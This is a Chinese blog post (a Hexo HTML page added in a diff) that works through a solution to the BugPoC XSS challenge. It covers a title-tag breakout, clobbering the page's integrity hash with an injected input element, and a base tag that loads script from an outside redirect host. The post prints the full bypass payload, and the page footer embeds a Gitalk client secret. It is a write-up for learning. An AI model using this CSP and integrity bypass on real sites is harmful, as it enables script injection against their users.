@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    记一次xss-challenge的复现 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-记一次xss-challenge的复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      记一次xss-challenge的复现
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-11-18T11:39:53.000Z" itemprop="datePublished">2020-11-18</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>看了一篇xss的帖子，自己对xss方面比较垃圾，跟着文章学习一下</p>
+<a id="more"></a>
+
+<p>题目链接</p>
+<p><a href="https://wacky.buggywebsite.com/" target="_blank" rel="noopener">https://wacky.buggywebsite.com/</a></p>
+<p>题目界面</p>
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201118194444163.png" alt="image-20201118194444163"></p>
+<p>大致的功能就是可以将输入的字符进行”美化“，其实就是换了个颜色。。。。然后右键查看源代码，有一个<code>&lt;iframe&gt;</code>标签，访问对应的链接，</p>
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201118194630150.png" alt="image-20201118194630150"></p>
+<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119101858849.png" alt="image-20201119101858849" style="zoom:200%;">
+
+<p>提示当前页面只能在iframe里面看，然后右键查看源代码，其中关键的一段如下，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"ygdsnjslxhwp"</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>.fileIntegrity = <span class="built_in">window</span>.fileIntegrity || &#123;</span></span><br><span class="line"><span class="actionscript">			<span class="string">'rfc'</span> : <span class="string">' https://w3c.github.io/webappsec-subresource-integrity/'</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'algorithm'</span> : <span class="string">'sha256'</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'value'</span> : <span class="string">'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E='</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'creationtime'</span> : <span class="number">1602687229</span></span></span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"><span class="actionscript">		<span class="comment">// verify we are in an iframe</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (<span class="built_in">window</span>.name == <span class="string">'iframe'</span>) &#123;</span></span><br><span class="line">			</span><br><span class="line"><span class="actionscript">			<span class="comment">// securely load the frame analytics code</span></span></span><br><span class="line">			if (fileIntegrity.value) &#123;</span><br><span class="line">				</span><br><span class="line"><span class="actionscript">				<span class="comment">// create a sandboxed iframe</span></span></span><br><span class="line"><span class="javascript">				analyticsFrame = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="actionscript">				analyticsFrame.setAttribute(<span class="string">'sandbox'</span>, <span class="string">'allow-scripts allow-same-origin'</span>);</span></span><br><span class="line"><span class="actionscript">				analyticsFrame.setAttribute(<span class="string">'class'</span>, <span class="string">'invisible'</span>);</span></span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.body.appendChild(analyticsFrame);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">				<span class="comment">// securely add the analytics code into iframe</span></span></span><br><span class="line"><span class="javascript">				script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'src'</span>, <span class="string">'files/analytics/js/frame-analytics.js'</span>);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'integrity'</span>, <span class="string">'sha256-'</span>+fileIntegrity.value);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'crossorigin'</span>, <span class="string">'anonymous'</span>);</span></span><br><span class="line">				analyticsFrame.contentDocument.body.appendChild(script);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.body.innerHTML = <span class="string">`</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>This page can only be viewed from an iframe.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">"400"</span> <span class="attr">controls</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">				<span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;/<span class="name">video</span>&gt;</span>`</span></span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>只有在<code>window.name</code>为<code>iframe</code>时才会创建一个<code>iframe</code>标签，只可以通过如下<code>payload</code>来绕过，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name=<span class="string">"iframe"</span>;</span></span><br><span class="line"><span class="actionscript">location.href = <span class="string">"https://wacky.buggywebsite.com/frame.html?param=xss"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>并在<code>&lt;iframe&gt;</code>标签中添加了<code>sandbox</code>属性，</p>
+<blockquote>
+<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119142538319.png" alt="image-20201119142538319" style="zoom:150%;">
+</blockquote>
+<p>之后还会添加一个<code>script</code>标签到其中，其中src是采用的相对路径，还利用了<code>integrity</code>来确保资源的完整性。之后我们寻找<code>https://wacky.buggywebsite.com/frame.html?param=xss</code>链接中的xss注入点，发现可以通过<code>&lt;/title&gt;</code>标签来闭合前面的标签，然后插入html代码，</p>
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119105856645.png" alt="image-20201119105856645"></p>
+<p>但是因为存在CSP，不能执行</p>
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119110041168.png" alt="image-20201119110041168"></p>
+<p>查看对应的CSP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &#39;nonce-syvmzvejfjgs&#39; &#39;strict-dynamic&#39;; frame-src &#39;self&#39;; object-src &#39;none&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119110704352.png" alt="image-20201119110704352"></p>
+<p>可以插入<code>&lt;base&gt;</code>标签，url定义为我们自己的VPS，然后在<code>files/analytics/js/frame-analytics.js</code>中插入xss代码，因为源码中是将<code>window.fileIntegrity.value</code>来当<code>&lt;script&gt;</code>标签的<code>integrity</code>值，如下<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119111714068.png" alt="image-20201119111714068" style="zoom:200%;"></p>
+<blockquote>
+<h1 id="Subresource-Integrity"><a href="#Subresource-Integrity" class="headerlink" title="Subresource Integrity"></a>Subresource Integrity</h1><p><strong>子资源完整性</strong>(SRI)是允许浏览器检查其获得的资源（例如从 <a href="https://developer.mozilla.org/en-US/docs/Glossary/CDN" target="_blank" rel="noopener">CDN</a> 获得的）是否被篡改的一项安全特性。它通过验证获取文件的哈希值是否和你提供的哈希值一样来判断资源是否被篡改。</p>
+<p>将使用 base64 编码过后的文件哈希值写入你所引用的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script" target="_blank" rel="noopener"><code>&lt;script&gt;</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link" target="_blank" rel="noopener"><code>&lt;link&gt;</code></a> 标签的 <strong>integrity</strong> 属性值中即可启用子资源完整性功能。</p>
+<p>integrity 值分成两个部分，第一部分指定哈希值的生成算法（目前支持 sha256、sha384 及 sha512），第二部分是经过 base64 编码的实际哈希值，两者之间通过一个短横（-）分割。</p>
+</blockquote>
+<p>所以可以通过注入下面代码绕过，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">'fileIntegrity'</span> <span class="attr">value</span>=<span class="string">'aErQrfRCGgdInIpMEDCWj2%2bHQUab648smjdgPAUdBKU='</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112037023.png" alt="image-20201119112037023"></p>
+<p>利用BugPoC生成payload。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"Access-Control-Allow-Origin"</span>:<span class="string">"*"</span>,</span><br><span class="line">	<span class="attr">"Content-type"</span>:<span class="string">"text/javascript"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112633325.png" alt></p>
+<p>最后payload:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name=<span class="string">"iframe"</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">location.href = "https://wacky.buggywebsite.com/frame.html?param=<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">'fileIntegrity'</span> <span class="attr">value</span>=<span class="string">'QkIPs1Inueee8IH+HXpScbWfI0zPgWJvCB9LGWZH/Wc='</span>&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">'https://0vc3zrq6aqua.redir.bugpoc.ninja/'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112858083.png" alt="image-20201119112858083"></p>
+<p>参考链接</p>
+<p><a href="https://jinone.github.io/BugPoc-XSS-Challenge/" target="_blank" rel="noopener">BugPoc XSS Challenge</a></p>
+<p><a href="https://www.srihash.org/" target="_blank" rel="noopener">https://www.srihash.org/</a></p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/11/18/记一次xss-challenge的复现/" target="_blank" title="记一次xss-challenge的复现">http://mount4in.github.io/2020/11/18/记一次xss-challenge的复现/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/" data-id="clg20p5vq001x14uv11j3an22"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            ubuntu搭建weblogic环境,配合IDEA调试
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020上海市大学生网络安全大赛部分wp</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
